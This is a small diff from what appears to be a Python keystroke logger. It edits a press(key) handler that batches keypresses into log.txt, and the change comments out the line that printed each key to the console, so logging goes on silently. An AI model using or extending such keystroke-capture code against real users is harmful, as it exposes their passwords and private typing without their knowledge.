@@ -23,7 +23,7 @@ def press(key):
     if count >= 10 or key == "esc":
         count = 0
         write_file()
-    print(f"{key}")
+    # print(f"{key}")
 
 def write_file():
     with open("./log.txt", mode="a") as log:
